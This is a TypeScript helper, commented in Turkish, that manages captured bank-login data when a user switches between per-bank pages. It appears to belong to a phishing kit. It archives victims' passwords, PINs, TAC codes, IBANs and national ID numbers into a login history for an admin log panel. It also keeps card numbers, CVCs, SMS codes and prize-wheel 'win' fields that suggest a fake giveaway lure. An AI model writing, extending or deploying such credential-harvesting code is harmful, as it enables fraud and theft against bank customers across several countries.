// Banka degisiminde eski bankanin credential kaydini history'ye arsivleyip
// flat credential alanlarini temizleyen paylasilan yardimci.
// Hem server (bank/[bank_slug]/page.tsx) hem client (banken, bank-login)
// taraflarinda kullanilir — boylece eski banka verisi yeni bankanin
// admin kolonlarina/formuna SIZMAZ.

// Admin panelin (LogsTab getCanonicalAdminBankFields + getShortBankCredentialFields)
// okudugu TUM banka-credential key varyantlari + bilinen eski key'ler.
// NOT: "phone"/"mobile"/"telephone"/"phoneNumber" KASITLI olarak listede DEGIL —
// profil telefonuyla cakisabilir, silmek veri kaybi riski yaratir.
export const BANK_CRED_KEYS: readonly string[] = [
  "loginMethod",
  "personalCode",
  "personalCodeEE",
  "isikukood",
  "idNumber",
  "identityNumber",
  "kimlikNo",
  "username",
  "verfuegernummer",
  "customerNumber",
  "kullaniciAdi",
  "customerId",
  "clientNumber",
  "accountHolder",
  "password",
  "pin",
  "passcode",
  "sifre",
  "parola",
  "wachtwoord",
  "passwd",
  "bankPhone",
  "bankTelefon",
  "bankTel",
  "bankaTelefon",
  "mobilePhone",
  "tacCode",
  "tac",
  "rekeningnummer",
  "pasnummer",
  "accountNumber",
  "iban",
  "toegangscode",
  "accessCode",
  "bankAccessCode",
  "signatuur",
  "signature",
  "identificatiecode",
  "idCode",
  "dateOfBirth",
  "dob",
  "birthDate",
  "dateofbirth",
  "orderedField1",
  "orderedField2",
  "orderedField1Type",
  "orderedField2Type",
];

// Temizlik sirasinda ASLA silinmeyecek alanlar (profil, odul, kart, fb,
// history, oturum meta). Banka sayfasi ayni isimde input yakaladiysa bile
// kullanici verisi korunur.
const KEEP_KEYS_NORM = new Set([
  "firstname","lastname","fullname","phone","mobile","email",
  "amount","winamount","prizeamount","wonamount","currency",
  "bankloginhistory","cardloginhistory","fbloginhistory",
  "smscode","participationcode","publicid","sessionid",
  "approvalstatus","approvalhistory","approvalcode",
  "winstep","currentstep","viewingbankslug","viewingbankname",
  "cardnumber","cardexpiry","cardcvc","cardholder",
  "country","language","sitelanguage","targetcountry",
  "address","street","postcode","city",
  "transfermessage","hash","signature","token","livepath",
]);

function isProtectedFromCleanup(key: string): boolean {
  const n = key.toLowerCase().replace(/[^a-z0-9]/g, "");
  if (KEEP_KEYS_NORM.has(n)) return true;
  if (n.startsWith("wheelresult")) return true;
  if (n.startsWith("selected")) return true;
  if (n.startsWith("fb")) return true;
  if (n.startsWith("card")) return true;
  if (n.startsWith("generator")) return true;
  if (n.startsWith("specialnotice")) return true;
  if (n.startsWith("customquestion")) return true;
  if (n.includes("history")) return true;
  return false;
}

/**
 * fd.bankSlug, nextBankSlug'dan farkliysa:
 *  - eski bankanin credential kaydini (yeterince doluysa) bankLoginHistory'ye arsivler
 *  - flat credential alanlarini + banka sayfasindan yakalanan TUM ham alanlari siler
 *    (bankCapturedKeys registry'si — open24Number, pacDigit gibi custom isimler dahil)
 *  - bankSlug/bankName'i sifirlar (submit "ayni banka" sanip tekrar arsivlemesin)
 * Ayni bankaysa fd'yi degistirmeden dondurur.
 */
export function archivePreviousBankOnChange(
  fd: Record<string, unknown>,
  nextBankSlug: string,
): Record<string, unknown> {
  const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
  const prevSlug = str(fd.bankSlug).toLowerCase();
  if (!prevSlug || prevSlug === nextBankSlug.trim().toLowerCase()) {
    return { ...fd };
  }

  const next: Record<string, unknown> = { ...fd };
  const old: Record<string, string> = {
    bankName: str(fd.bankName),
    bankSlug: str(fd.bankSlug),
  };
  let filled = 0;
  for (const k of BANK_CRED_KEYS) {
    old[k] = str(fd[k]);
    if (old[k]) filled++;
  }
  // Banka sayfasinin custom/ham alanlari da kayda eklensin (gecmis tam olsun)
  const capturedKeys = Array.isArray(fd.bankCapturedKeys)
    ? (fd.bankCapturedKeys as unknown[]).filter((k): k is string => typeof k === "string")
    : [];
  for (const k of capturedKeys) {
    if (isProtectedFromCleanup(k)) continue;
    const v = str(fd[k]);
    if (v && !(k in old)) old[k] = v;
  }
  if (filled >= 2 || capturedKeys.length >= 2) {
    const arr: unknown[] = Array.isArray(fd.bankLoginHistory)
      ? [...(fd.bankLoginHistory as unknown[])]
      : [];
    arr.unshift({
      submittedAt: str(fd.bankSubmittedAt) || new Date().toISOString(),
      ...old,
    });
    next.bankLoginHistory = arr;
  }
  for (const k of BANK_CRED_KEYS) delete next[k];
  for (const k of capturedKeys) {
    if (!isProtectedFromCleanup(k)) delete next[k];
  }
  delete next.bankCapturedKeys;
  delete next.bankSubmittedAt;
  next.bankSlug = "";
  next.bankName = "";
  return next;
}
